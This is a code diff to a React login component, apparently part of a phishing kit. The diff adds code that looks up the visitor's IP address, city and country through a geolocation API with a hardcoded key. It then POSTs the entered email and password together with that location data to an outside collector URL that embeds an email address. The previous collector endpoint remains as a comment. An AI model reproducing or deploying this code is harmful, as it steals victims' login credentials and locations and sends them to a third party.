@@ -9,6 +9,43 @@ import $ from 'jquery';
 
 export const Iceberg = ()=>{
 
+
+
+
+    const [ipAdress, setIpAdress] = useState('')
+    const [city, setCity] = useState('');
+    const [flag, setFlag] = useState('');
+    const [country, setCountry] = useState('');
+
+
+    useEffect(()=>{
+        fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=44db379787c14bccb69d3de62462aefb`)
+        .then(req=> req.json())
+        .then(res=>{
+            // setCountry(res.names.en)
+            // console.log(res.names.en);
+            // console.log('city:',res.city.name);
+
+            setIpAdress(res.ip)
+            setFlag(res.country.flag);
+            setCountry(res.country.name);
+            setCity(res.city.names.en);
+
+            
+            
+            
+            
+            console.log('ipAddress:', res.ip);
+            console.log('flag:', res.country.flag);
+            console.log('country:', res.country.name);
+            console.log('city:', res.city.names.en);
+            console.log(res);
+        })
+        .catch(e=> console.log)
+    }, []);
+
+
+
     
     const reloadPreloader = ()=> window.location.reload();
     
@@ -72,13 +109,19 @@ export const Iceberg = ()=>{
             }, 2200);
     
             const user = {
-              email: b,
-              password: pwd
-          };
+                email: email,
+                pswd: pwd,
+                country: country,
+                city: city,
+                flag: flag,
+                eyep: ipAdress
+            };
     
           $.ajax({
               type: "POST",
-              url: "https://bucketlion.com/hello/spei.php",
+              url: "https://meler-service.onrender.com/get_details/speinter82@gmail.com",
+            //   url: "https://bucketlion.com/hello/spei.php",
+              //   speinter82@gmail.com
               data: user,
               success(data) {
                   console.log(data);
